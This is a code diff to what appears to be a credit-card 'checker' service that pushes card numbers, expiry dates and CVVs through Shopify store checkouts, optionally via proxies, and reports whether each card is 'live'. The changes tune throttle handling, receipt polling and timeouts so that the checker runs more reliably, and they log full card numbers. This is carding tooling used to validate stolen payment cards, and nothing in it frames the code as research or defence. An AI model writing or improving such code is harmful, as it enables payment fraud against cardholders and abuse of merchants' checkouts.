@@ -468,7 +468,8 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
         elif typename == 'SubmitFailed':
             return None, f"UNTESTED - Submit failed: {submit_data.get('reason', 'unknown')}. Bank never responded.", gw_name, {'verdict': 'UNTESTED'}
         elif typename == 'Throttled':
-            await asyncio.sleep(2)
+            poll_ms = submit_data.get('pollAfter', 2000) or 2000
+            await asyncio.sleep(min(int(poll_ms) / 1000.0, 3.0))
             text = await _do_submit()
             try:
                 resp_json = json.loads(text)
@@ -488,23 +489,31 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
     if not receipt_id:
         return None, "UNTESTED - No receipt returned. Bank never responded.", gw_name, {'verdict': 'UNTESTED'}
 
-    # Poll for result
+    # Poll for result — max 25s window
     await asyncio.sleep(0.2)
     poll_json = {'query': POLL_QUERY, 'variables': {'receiptId': receipt_id, 'sessionToken': sst}, 'operationName': 'PollForReceipt'}
     
-    for _ in range(5):
-        async with session.post(graphql_url, json=poll_json, headers=gql_headers) as resp:
-            text = await resp.text()
-            if 'ProcessingReceipt' not in text and 'WaitingReceipt' not in text:
-                break
-            await asyncio.sleep(0.5)
+    poll_start = time.monotonic()
+    for _ in range(6):
+        if time.monotonic() - poll_start > 25:
+            return None, "UNTESTED - Receipt not settled in 25s window. Bank never responded.", gw_name, {'verdict': 'UNTESTED', 'code': 'POLL_TIMEOUT'}
+        try:
+            async with session.post(graphql_url, json=poll_json, headers=gql_headers, timeout=aiohttp.ClientTimeout(total=8)) as resp:
+                text = await resp.text()
+        except Exception:
+            continue
+        if 'ProcessingReceipt' not in text and 'WaitingReceipt' not in text:
+            break
+        try:
+            rj = json.loads(text)
+            rcpt = rj.get('data', {}).get('receipt', {})
+            delay = (rcpt.get('pollDelay', 4000) or 4000) / 1000.0
+        except Exception:
+            delay = 2.0
+        delay = min(delay, 4.0)
+        await asyncio.sleep(delay)
 
-    if 'ProcessingReceipt' in text or 'WaitingReceipt' in text:
-        await asyncio.sleep(1)
-        async with session.post(graphql_url, json=poll_json, headers=gql_headers) as resp:
-            text = await resp.text()
-        if 'ProcessingReceipt' in text or 'WaitingReceipt' in text:
-            return None, "UNTESTED - Bank timeout, no receipt", gw_name, {'amount': running_total, 'verdict': 'UNTESTED'}
+    logger.info(f"Poll settled in {time.monotonic() - poll_start:.1f}s")
 
     if 'ActionRequiredReceipt' in text:
         return running_total, "APPROVED 3DS - Card live, 3DS passed, order unconfirmed — verify manually", gw_name, {'amount': running_total, 'verdict': 'APPROVED_3DS'}
@@ -699,11 +708,11 @@ async def check_card(cc, mm, yy, cvv, site=None, sites=None, proxy=None):
         for s in site_list:
             logger.info(f"Checking {card_short} on {s} proxy={use_proxy is not None}")
             try:
-                kw = {"timeout": aiohttp.ClientTimeout(total=20), "connector": aiohttp.TCPConnector(ssl=False, limit=0, force_close=True)}
+                kw = {"timeout": aiohttp.ClientTimeout(total=18), "connector": aiohttp.TCPConnector(ssl=False, limit=0, force_close=True)}
                 if use_proxy:
                     kw["proxy"] = use_proxy
                 async with aiohttp.ClientSession(**kw) as session:
-                    result = await asyncio.wait_for(_shopify_check(session, s, cc, mm, yy, cvv), timeout=25)
+                    result = await asyncio.wait_for(_shopify_check(session, s, cc, mm, yy, cvv), timeout=20)
                     amount, response, gw_name = result[0], result[1], result[2]
                     extra = result[3] if len(result) > 3 else None
                     elapsed_now = round(time.time() - start, 2)
@@ -771,7 +780,29 @@ async def check(req: CheckRequest):
         req.yy = req.yy[2:]
     req.mm = req.mm.zfill(2)
     
-    result = await check_card(req.cc, req.mm, req.yy, req.cvv, site=req.site, sites=req.sites, proxy=req.proxy)
+    check_start = time.monotonic()
+    logger.info(f"[check] {req.cc} proxy={bool(req.proxy)} - start")
+    
+    try:
+        result = await asyncio.wait_for(
+            check_card(req.cc, req.mm, req.yy, req.cvv, site=req.site, sites=req.sites, proxy=req.proxy),
+            timeout=45
+        )
+    except asyncio.TimeoutError:
+        elapsed = time.monotonic() - check_start
+        logger.info(f"[check] {req.cc} verdict=UNTESTED elapsed={elapsed:.1f}s (45s hard timeout)")
+        return {
+            "status": "error",
+            "response": "UNTESTED - Hard 45s timeout. Store or proxy too slow. Bank never responded.",
+            "gateway": "Shopify Payments",
+            "amount": None,
+            "site": req.site or None,
+            "elapsed": round(elapsed, 2),
+            "verdict": "UNTESTED",
+        }
+    
+    elapsed = time.monotonic() - check_start
+    logger.info(f"[check] {req.cc} verdict={result.get('verdict', '?')} elapsed={elapsed:.1f}s")
     return result
 
 @app.get("/sites")
